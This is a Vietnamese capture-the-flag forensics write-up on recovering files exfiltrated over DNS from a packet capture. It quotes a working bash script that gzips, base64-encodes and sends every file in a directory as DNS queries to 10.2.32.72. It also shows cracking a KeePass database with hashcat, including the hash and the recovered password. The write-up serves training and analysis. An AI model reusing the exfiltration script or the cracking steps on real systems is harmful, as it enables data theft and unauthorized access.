***NetLab2: Protected Vault***

![image](https://github.com/user-attachments/assets/e04bf9e3-3b83-41ba-8b4a-e58bca68697d)

Nhìn trong file khi dung Export Oject ta được ```update.sh``` như sau:

```python
for f in $(ls .); 
do s=4;b=50;c=0; 
for r in $(for i in $(gzip -c $f| base64 -w0 | sed "s/.\{$b\}/&\n/g");
do if [[ "$c" -lt "$s"  ]]; then echo -ne "$i-.";
 c=$(($c+1)); 
 else echo -ne "\n$i-."; 
 c=1;
  fi; 
  done ); 
 do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr "+" "}"|tr "/" "{"` +short; 
 done ; 
 done
```

dịch đoạn code sau ta có vài điểm lưu ý:

```python
 else echo -ne "\n$i-.";
```
Đây là thay thế xuống dòng bằng ```i-```

```python
 do dig +tries=1 +timeout=1 +noidnin +noidnout @10.2.32.72 `echo -ne $r$(echo $f|base58)|tr "+" "}"|tr "/" "{"` +short;
```

Thay thế ```+``` bằng ```}```, ```/``` bằng ```{```.
Lưu ý 2 điểm này nó sẽ quan trọng trong bài toán sau.
>
Filter dns thấy được 1 luồn file như base64, chúng ta sẽ tách ra hết để decode xem thử.

```python
tshark -nr netlab2.pcap -Y "dns" -T fields -e dns.qry.name > dns.txt
```

Có vẻ này là file đã decode từ đoạn code kia và vì tác giả bài wu đã thử base64 rất nhiều lần :))). Nên giờ sẽ sửa lại như 2 điều ở trên đã nói bằng đoạn python sau.

```python
# Đọc nội dung từ tệp input
with open('dns.txt', 'r', encoding='utf-8') as file:
    content = file.readlines()

# Xử lý nội dung
processed_lines = []
for line in content:
    # Giải mã chuỗi hex
    try:
        decoded_line = bytes.fromhex(line.strip()).decode('utf-8')
        
        # Thay thế '-.' bằng ký tự xuống dòng
        decoded_line = decoded_line.replace('-.', '\n')
        
        # Thay thế '}' bằng '+'
        decoded_line = decoded_line.replace('}', '+')
        
        # Thay thế '{' bằng '/'
        decoded_line = decoded_line.replace('{', '/')
        
        # Nếu dòng không chứa "ubuntu", thêm vào danh sách
        if 'ubuntu' not in decoded_line:
            processed_lines.append(decoded_line)
    except Exception as e:
        print(f"Không thể giải mã dòng: {line.strip()} - Lỗi: {e}")

# Ghi kết quả vào tệp output
with open('t2.txt', 'w', encoding='utf-8') as file:
    file.writelines(processed_lines)

print("Quá trình xử lý đã hoàn tất!")

```

Sau khi tách bằng file code sau được file t3.txt nhưng không đẩu đủ chúng ta cần xóa những dòng dư thừa bằng code python sau.

```python
# Các chuỗi cần xóa
strings_to_remove = [
    "7bgTtW3Fp59pgy", "2PmGj7XTSNwg5", "2NHJWYG1EYAkZ",
    "2x9kyYFcUyDeC2c65", "4xUi2j75eJtNc1", "2tuJoHGout6YhgSX3",
    "9CUmw2dKFRrmvfhiEM"
]

# Đọc nội dung từ tệp input
with open('t2.txt', 'r', encoding='utf-8') as file:
    lines = file.readlines()

# Lọc các dòng không chứa các chuỗi cần xóa
filtered_lines = [
    line for line in lines if not any(substring in line for substring in strings_to_remove)
]

# Ghi kết quả vào tệp output
with open('gob', 'w', encoding='utf-8') as file:
    file.writelines(filtered_lines)

print("Quá trình xử lý đã hoàn tất!")
```

Sau đó chúng ta decode base64 treeb cyberchef đem đi binwalk.

sau z chúng ta binwalk được file nén sau được con đường hy vọng.

```python
╭─   nart   ~/Solve                                                                          ✔  03:10:54 AM  ─╮
╰─❯ binwalk -e pls.zip                                                                                               ─╯

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             gzip compressed data, has original file name: "blueteam.bmp", from Unix, last modified: 2022-04-08 06:35:19
27707         0x6C3B          gzip compressed data, has original file name: "discord.png", from Unix, last modified: 2022-09-25 06:48:33
27734         0x6C56          PNG image, 256 x 256, 8-bit colormap, non-interlaced
29086         0x719E          gzip compressed data, has original file name: "Flag.kdbx", from Unix, last modified: 2022-10-24 06:24:10
31373         0x7A8D          gzip compressed data, has original file name: "gaixinh.jpg", from Unix, last modified: 2022-07-19 18:20:33
40164         0x9CE4          gzip compressed data, has original file name: "kcsc.png", from Unix, last modified: 2022-09-25 06:48:33
53705         0xD1C9          gzip compressed data, has original file name: "meme.jpg", from Unix, last modified: 2022-09-25 06:48:33
69258         0x10E8A         gzip compressed data, has original file name: "update.sh", from Unix, last modified: 2022-10-24 06:59:42
```
thấy được đích r

![image](https://github.com/user-attachments/assets/0d331f03-b9cd-467e-a04c-1df059a2332f)

Sau khi mò thì thấy file Flag.kdbx hợp lý nhất nên sẽ tấn công nó.

Có vẻ như file ```.kdbx``` là file nén đặc biệt nên cần tải công cụ đặc biệt để mở nó.

![image](https://github.com/user-attachments/assets/d1a72f03-8115-4ce9-a217-6e85f72bfb49)

Không chỉ là đặc biệt mà còn cần key.

Chúng ta sẽ hash nó ra và get key bằng hashcat vì không thể kiếm thấy key trong file.

![image](https://github.com/user-attachments/assets/5deafc64-f33f-4076-bee6-33a37c0ccb00)

tôi lưu vào file ```pass```. Và chạy chay tìm pass.

```python
╭─   nart   ~/Solve/_pls.zip.extracted                                            ✔  1m 14s   12:37:02 PM  ─╮
╰─❯ hashcat -m 13400 -a 0 hash Wiki10k.txt                                                                           ─╯
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2848/5760 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 4 MB

Dictionary cache built:
* Filename..: Wiki10k.txt
* Passwords.: 10000
* Bytes.....: 76508
* Keyspace..: 10000
* Runtime...: 0 secs

$keepass$*2*60000*0*54b674142f9a18aaed00cf79a0bfc32ba37b843b48123f453a83c2c81ca44ffe*24dfb9b36f51c496db792487fa2368078a41f51f0b84ffe57e427e6efe6d987f*b9772351efb550cb41d4d41c0ae6022c*0904ea8a12808b2a8e15385b6891f97e92bf35241f1e21598dec77ef1eae8347*1c22d2dc121964a9c2f89891eea06739c66631f083b09045989ea6bde85f3f8a:iloveyou

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13400 (KeePass 1 (AES/Twofish) and KeePass 2 (AES))
Hash.Target......: $keepass$*2*60000*0*54b674142f9a18aaed00cf79a0bfc32...5f3f8a
Time.Started.....: Tue Nov  5 12:41:04 2024 (2 secs)
Time.Estimated...: Tue Nov  5 12:41:06 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (Wiki10k.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      230 H/s (4.41ms) @ Accel:32 Loops:256 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 512/10000 (5.12%)
Rejected.........: 0/512 (0.00%)
Restore.Point....: 0/10000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:59904-60000
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> guinness

Started: Tue Nov  5 12:40:10 2024
Stopped: Tue Nov  5 12:41:08 2024
```
pass nhận được là ```iloveyou```

giờ nhập vào và getkey thôi.

![image](https://github.com/user-attachments/assets/7bb70ad8-7d0f-42e0-a16a-83366e75518b)

flag : ```Flag{NetLab2_DNS_3xf1ltr4t10n_15_5t3al7hy}```



